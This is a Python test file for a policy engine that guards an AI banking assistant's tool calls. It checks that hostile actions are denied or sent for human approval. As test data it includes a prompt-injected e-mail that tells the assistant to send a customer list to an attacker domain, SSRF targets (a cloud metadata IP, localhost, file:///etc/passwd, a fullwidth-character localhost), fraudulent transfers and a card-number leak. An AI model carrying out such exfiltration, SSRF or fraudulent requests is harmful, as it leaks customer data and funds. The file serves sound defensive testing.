"""End-to-end scenarios on the shipped policies (the worked examples in docs/policy-language.md)."""

from __future__ import annotations

import pytest
from policy_helpers import POLICY_DIR, codes, make_call

from mirsad.models import Action, SinkKind
from mirsad.policy import PolicyEngine, RateLimiter

BANK_AGENT = "bank-support-assistant"


@pytest.fixture
def bank() -> PolicyEngine:
    return PolicyEngine.from_file(POLICY_DIR / "strict-banking.yaml", rate_limiter=RateLimiter())


# --------------------------------------------------------------------------- scenario 1: e-mail exfiltration


def test_scenario_injected_email_exfiltration(engine):
    # An injected e-mail tells the assistant to forward the customer list to an attacker.
    call = make_call("send_email", to="reports@exfil-hub.example", subject="Q3", body="Customer list ...")
    ev = engine.evaluate_call(call, session_tainted=True)
    assert ev.sink == SinkKind.EXTERNAL
    assert ev.action == Action.REQUIRE_APPROVAL  # domain_in constraint escalates to a human

    bulk = ", ".join(f"customer{i}@najd-trading.example" for i in range(60))
    ev = engine.evaluate_call(make_call("send_email", to="reports@exfil-hub.example", body=bulk))
    assert ev.action == Action.DENY  # global rule: never e-mail more than 50 records
    assert "RULE_MATCH" in codes(ev.reasons)


# --------------------------------------------------------------------------- scenario 2: SSRF


@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/", "http://localhost:8700/api/users", "file:///etc/passwd",
    "http://ｌｏｃａｌｈｏｓｔ/", "https://db.internal/",
])
def test_scenario_ssrf_via_fetch_url_is_denied(engine, url):
    assert engine.evaluate_call(make_call("fetch_url", url=url)).action == Action.DENY


def test_scenario_ordinary_fetch_is_allowed(engine):
    assert engine.evaluate_call(make_call("fetch_url", url="https://news.example/markets")).action == Action.ALLOW


# --------------------------------------------------------------------------- scenario 3: fraudulent transfer


def test_scenario_fraudulent_transfer(engine):
    big = engine.evaluate_call(make_call("transfer_funds", to_iban="SA4420000001234567891234", amount_sar="50,000"))
    assert big.action == Action.DENY
    small = engine.evaluate_call(make_call("transfer_funds", to_iban="SA4420000001234567891234", amount_sar=900))
    assert small.action == Action.REQUIRE_APPROVAL
    assert codes(small.reasons) == ["TOOL_RISK", "APPROVAL_ALWAYS"]


# --------------------------------------------------------------------------- strict banking sample


def test_bank_transfer_after_reading_a_ticket_is_denied(bank):
    call = make_call("transfer_funds", agent=BANK_AGENT, to_iban="SA4420000001234567891234", amount_sar=100)
    assert bank.evaluate_call(call).action == Action.REQUIRE_APPROVAL
    tainted = bank.evaluate_call(call, session_tainted=True)
    assert tainted.action == Action.DENY
    assert "no-transfer-after-untrusted-input" in [r.rule_id for r in tainted.reasons]


def test_bank_every_external_sink_needs_approval(bank):
    ev = bank.evaluate_call(make_call("send_email", agent=BANK_AGENT, to="customer@mail.example", body="Hello"))
    assert ev.sink == SinkKind.EXTERNAL
    assert ev.action == Action.REQUIRE_APPROVAL
    assert "external-sinks-need-approval" in [r.rule_id for r in ev.reasons]
    internal = bank.evaluate_call(make_call("reply_to_ticket", agent=BANK_AGENT, ticket_id="TCK-000123",
                                            body="We have frozen the card."))
    assert internal.action == Action.ALLOW


def test_bank_blocks_card_numbers_and_foreign_urls(bank):
    leak = bank.evaluate_call(make_call("reply_to_ticket", agent=BANK_AGENT, ticket_id="TCK-000123",
                                        body="Your card 4111 1111 1111 1111 is active"))
    assert leak.action == Action.DENY
    fetch = bank.evaluate_call(make_call("fetch_url", agent=BANK_AGENT, url="https://evil.example/help"))
    assert fetch.action == Action.DENY


def test_bank_constraints_on_identifiers_and_amounts(bank):
    ev = bank.evaluate_call(make_call("pay_bill", agent=BANK_AGENT, biller_id="BLR-12", amount_sar="9000"))
    # "9000" is a string: strict `type: number` fires as well as `max` (which compares it numerically)
    assert {r.evidence["operator"] for r in ev.reasons if r.code == "CONSTRAINT_VIOLATION"} == {
        "pattern", "type", "max"}
    unknown = bank.evaluate_call(make_call("admin_reset_password", agent=BANK_AGENT))
    assert codes(unknown.reasons) == ["TOOL_NOT_ALLOWED"]
    assert bank.detector_settings(BANK_AGENT, "read_ticket").block_threshold == 0.6
